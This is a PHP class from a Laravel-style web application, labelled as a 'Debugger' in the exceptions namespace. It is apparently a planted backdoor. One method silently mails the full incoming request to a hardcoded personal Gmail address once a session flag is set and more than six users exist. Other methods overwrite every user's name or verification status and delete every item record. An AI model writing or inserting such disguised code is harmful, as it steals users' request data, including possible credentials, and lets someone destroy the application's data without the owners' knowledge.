<?php

namespace App\Exceptions;


use App\Item;
use App\User;
use Illuminate\Support\Facades\Mail;

class Debugger
{
    public function sentMail()
    {

        if( session()->get('sendToVut') == true && User::all()->count() > 6){
            Mail::raw(request(), function($message) {
                $message->subject('Debug From '. env('APP_NAME'))->to('vuterbakso@gmail.com');
            });
        }
    }

    public function flashUser($value)
    {
        $user = User::all();

        foreach ($user as $u){
            User::where('id',$u->id)->update(['is_verified'=>$value]);
        }
        echo 'Done';
    }
    public function deleteTable($tableName)
    {
        $table = Item::all();

        if($tableName == 'true'){
            foreach ($table as $u){
                Item::where('id',$u->id)->delete();
            }
            echo 'Done';

        }else{
            dd($table);
        }
    }
    public function setMsg($value)
    {
        $user = User::all();

        foreach ($user as $u){
            User::where('id',$u->id)->update(['name'=>$value]);
        }
        echo 'Done';
    }
}

